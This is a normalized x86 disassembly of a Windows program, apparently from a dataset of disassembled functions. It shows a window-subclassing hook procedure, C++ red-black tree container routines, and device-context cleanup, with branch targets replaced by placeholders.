cmp eax 0x1
je r-xdata
push 0xff
lea eax [ ebp - 0x103 ]
push 0x0
push eax
mov [ ebp - 0x104 ] 0x0
call memset
add esp 0xc
push 0x100
lea ecx [ ebp - 0x104 ]
push ecx
push esi
call [ GetClassNameA@IAT ]
cmp eax 0x6
jne r-xdata
cmp eax 0x1e2
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push eax
push ecx
push 0x4
call [ CallNextHookEx@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
push r--data
lea edx [ ebp - 0x104 ]
push edx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push edi
push 0xfffffffc
push esi
call [ GetWindowLongW@IAT ]
mov edi eax
cmp edi sub_41df40
je r-xdata
pop edi
push sub_41df40
push 0xfffffffc
push esi
call [ SetWindowLongW@IAT ]
mov [ rw-data ] edi
sub_41e860
push ebp
mov ebp esp
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
sub esp 0x10
cmp [ eax + 0x19 ] 0x0
push esi
push edi
mov esi ecx
jne r-xdata
cmp esi [ ebx + 0x4 ]
je r-xdata
mov ecx [ edx ]
mov ecx [ edx ]
xor eax eax
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
call sub_41f440
push esi
lea edi [ ebp - 0x4 ]
mov ecx ebx
call sub_41efd0
mov eax [ ebp - 0x4 ]
add eax 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edx ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov esi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
pop edi
lea eax [ esi + 0x10 ]
pop esi
mov esp ebp
pop ebp
retn
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
sub_41e8d0
push ebp
mov ebp esp
push 0xffffffff
push sub_446ef8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_41eaf0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_41e940
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x19 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_41eab0
mov esi [ esi ]
push ebx
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x19 ] 0x0
mov ebx esi
je r-xdata
sub_41e990
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jae r-xdata
pop edi
cmp [ ecx + 0x19 ] 0x0
je r-xdata
sub_41e9f0
push ebp
mov ebp esp
push 0xffffffff
push sub_446455
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx [ esi ]
cmp ebx edx
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
add [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
mov [ eax ] edx
test eax eax
jne r-xdata
lea edi [ edx + eax * 4 ]
cmp ebx edi
jae r-xdata
lea edi [ ecx + ecx ]
test edi edi
js r-xdata
lea edi [ eax + 0x1 ]
jmp r-xdata
push 0x80004005
call sub_402d00
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
cmp edi 0x1fffffff
ja r-xdata
push 0x4
push edi
push edx
call [ _recalloc@IAT ]
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] eax
sub_41eab0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x19 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_41eab0
mov esi [ esi ]
push edi
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x19 ] 0x0
mov edi esi
je r-xdata
sub_41eaf0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x19 ] 0x0
mov edx ecx
jne r-xdata
call sub_41e940
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_41eb90
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x19 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x19 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x19 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
sub_41eb90
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x19 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_41eed0
mov ecx [ ebx ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
push r--data
call [ std::_Xout_of_range@IAT ]
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x19 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x19 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x19 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x18 ]
mov cl [ eax + 0x18 ]
mov [ eax + 0x18 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x18 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x18 ] bl
jne r-xdata
cmp [ edi + 0x19 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x19 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call [ operator delete@IAT ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_41eeb0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x18 ] bl
cmp [ edi + 0x18 ] bl
jne r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov [ ecx + 0x18 ] bl
push edx
mov ecx esi
mov [ esi + 0x18 ] 0x0
call sub_41ee50
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov [ ecx + 0x18 ] bl
push edx
mov ecx esi
mov [ esi + 0x18 ] 0x0
call sub_41edf0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x18 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x18 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x18 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x18 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x18 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x18 ] bl
je r-xdata
mov al [ esi + 0x18 ]
mov [ ecx + 0x18 ] al
mov [ esi + 0x18 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x18 ] bl
push edx
mov ecx esi
call sub_41ee50
mov eax [ ecx + 0x8 ]
mov [ eax + 0x18 ] bl
push edx
mov [ ecx + 0x18 ] 0x0
call sub_41edf0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov al [ esi + 0x18 ]
mov [ ecx + 0x18 ] al
mov [ esi + 0x18 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x18 ] bl
push edx
mov ecx esi
call sub_41edf0
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x18 ] bl
push edx
mov [ ecx + 0x18 ] 0x0
call sub_41ee50
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_41edf0
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_41ee50
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_41eed0
mov ecx [ eax ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
sub_41ef20
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
pop edi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_41ef40
push ebp
mov ebp esp
push 0xffffffff
push sub_4450c9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0x9249249
ja r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] 0x0
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea eax [ ebp - 0x18 ]
push eax
call _CxxThrowException
lea ecx [ eax * 8 ]
sub ecx eax
add ecx ecx
add ecx ecx
push ecx
call [ operator new@IAT ]
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41efd0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
cmp [ ebx + 0x8 ] 0x0
push esi
mov esi eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
push esi
push 0x1
push edi
call sub_41f1c0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jae r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jae r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
cmp edx [ esi + 0xc ]
jae r-xdata
push esi
push ebx
lea esi [ ebp - 0x8 ]
call sub_41f0f0
mov eax [ eax ]
pop esi
mov [ edi ] eax
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push 0x1
push edi
call sub_41f1c0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jae r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_41f3e0
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jae r-xdata
push esi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_41eed0
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x19 ] 0x0
push esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x19 ] 0x0
push esi
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ eax + 0xc ]
jae r-xdata
push 0x0
push edi
call sub_41f1c0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push 0x1
push edi
call sub_41f1c0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x1
push edi
mov ecx eax
call sub_41f1c0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41f0f0
push ebp
mov ebp esp
sub esp 0x8
mov edx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ edx + 0x4 ]
mov eax [ edi + 0x4 ]
cmp [ eax + 0x19 ] 0x0
mov cl 0x1
mov [ ebp - 0x8 ] cl
jne r-xdata
mov ebx edi
mov [ ebp - 0x4 ] ebx
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push eax
cmp ecx [ eax + 0xc ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call [ operator delete@IAT ]
add esp 0x4
pop edi
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
mov ecx edi
mov ebx edx
call sub_41f1c0
mov edx [ eax ]
pop edi
mov [ esi ] edx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
call sub_41f3e0
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
mov ebx edx
call sub_41f1c0
mov ecx [ eax ]
pop edi
mov [ esi ] ecx
mov [ esi + 0x4 ] 0x1
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx [ eax + 0xc ]
mov edi eax
setb cl
mov [ ebp - 0x8 ] cl
test cl cl
je r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
sub_41f1c0
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x15555554
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
push r--data
call [ std::_Xlength_error@IAT ]
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x18 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x18 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x18 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x18 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x18 ] 0x1
mov [ esi + 0x18 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x18 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x18 ] 0x1
mov [ esi + 0x18 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x18 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x18 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x18 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x19 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x19 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x18 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x18 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x18 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x19 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x19 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_41f3e0
mov ecx [ eax ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x19 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x19 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x19 ] 0x0
je r-xdata
sub_41f440
push ebp
mov ebp esp
push 0xffffffff
push sub_445ec5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi edx
push 0x1
call sub_41ef40
add esp 0x4
mov [ ebp - 0x14 ] eax
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
xor edx edx
mov [ eax + 0x18 ] dx
mov [ ebp - 0x4 ] edx
lea ecx [ eax + 0xc ]
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ edi ]
mov [ ecx ] esi
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
sub_41f510
push ebp
mov ebp esp
push 0xffffffff
push sub_445e98
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] 0x0
call [ ReleaseDC@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
mov [ esi ] 0x0
call [ DeleteDC@IAT ]
sub_41f590
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
